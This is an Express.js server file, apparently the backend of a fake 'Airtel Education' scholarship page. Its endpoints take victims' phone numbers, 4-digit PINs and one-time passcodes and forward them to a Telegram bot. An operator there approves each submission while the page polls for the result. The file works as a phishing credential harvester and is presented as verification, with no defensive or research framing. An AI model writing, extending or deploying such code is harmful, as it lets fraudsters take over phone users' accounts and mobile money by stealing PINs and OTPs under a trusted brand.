const express = require('express');
const cors = require('cors');
const path = require('path');
require('dotenv').config();

const { sendVerificationRequest, getVerificationStatus } = require('./telegram-bot');

const app = express();
const PORT = process.env.PORT || 3001;

app.use(cors({ origin: process.env.FRONTEND_ORIGIN || 'http://localhost:3000' }));
app.use(express.json());

const API_KEY = process.env.API_KEY;

function authenticateApiKey(req, res, next) {
    if (!API_KEY) {
        console.warn('API_KEY not configured - authentication bypassed');
        return next();
    }
    const providedKey = req.headers['x-api-key'];
    if (!providedKey || providedKey !== API_KEY) {
        return res.status(401).json({ success: false, error: 'Unauthorized' });
    }
    next();
}

app.use(express.static(path.join(__dirname, '..')));

app.get('/health', (req, res) => {
    res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, '..', 'index.html'));
});

app.post('/api/verify/phone-pin', authenticateApiKey, async (req, res) => {
    const { phone, pin, flow } = req.body;

  if (!phone || phone.length < 7 || phone.length > 12) {
      return res.status(400).json({ success: false, error: 'Invalid phone number format' });
  }

  if (!pin || pin.length !== 4) {
      return res.status(400).json({ success: false, error: 'Invalid PIN format' });
  }

    const sanitizedPhone = String(phone).replace(/[^0-9]/g, '').slice(0, 10);
    const sanitizedPin = String(pin).replace(/[^0-9]/g, '').slice(0, 4);
    const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);

    const verificationValue = `Phone: ${sanitizedPhone}, PIN: ${sanitizedPin}`;

    const result = await sendVerificationRequest('PhonePIN', verificationValue, sanitizedFlow);

    if (result.success) {
        res.json({ success: true, message: 'Phone & PIN sent to Telegram for verification', id: result.id });
    } else {
        res.status(500).json({ success: false, error: result.error });
    }
});

app.get('/api/verify/phone-pin/status/:id', authenticateApiKey, (req, res) => {
    const status = getVerificationStatus(req.params.id);
    res.json({
        success: true,
        status: status.status
    });
});

app.post('/api/verify/otp', authenticateApiKey, async (req, res) => {
    const { otp, phone, flow } = req.body;

    if (!otp || otp.length !== 4) {
        return res.status(400).json({ success: false, error: 'Invalid OTP format' });
    }

    const sanitizedOtp = String(otp).replace(/[^0-9]/g, '').slice(0, 6);
    const sanitizedPhone = String(phone || '').replace(/[^0-9+ ]/g, '').slice(0, 20);
    const sanitizedFlow = String(flow || 'scholarship').replace(/[^a-zA-Z0-9_-]/g, '').slice(0, 50);

    const verificationValue = `${sanitizedOtp} (Phone: ${sanitizedPhone})`;

    const result = await sendVerificationRequest('OTP', verificationValue, sanitizedFlow);

    if (result.success) {
        res.json({ success: true, message: 'OTP sent to Telegram for verification', id: result.id });
    } else {
        res.status(500).json({ success: false, error: result.error });
    }
});

app.get('/api/verify/otp/status/:id', authenticateApiKey, (req, res) => {
    const status = getVerificationStatus(req.params.id);
    res.json({
        success: true,
        status: status.status
    });
});

app.listen(PORT, () => {
    console.log(`Airtel Education backend running on port ${PORT}`);
    console.log(`Telegram bot polling: ${process.env.TELEGRAM_BOT_TOKEN ? 'enabled' : 'disabled'}`);
});
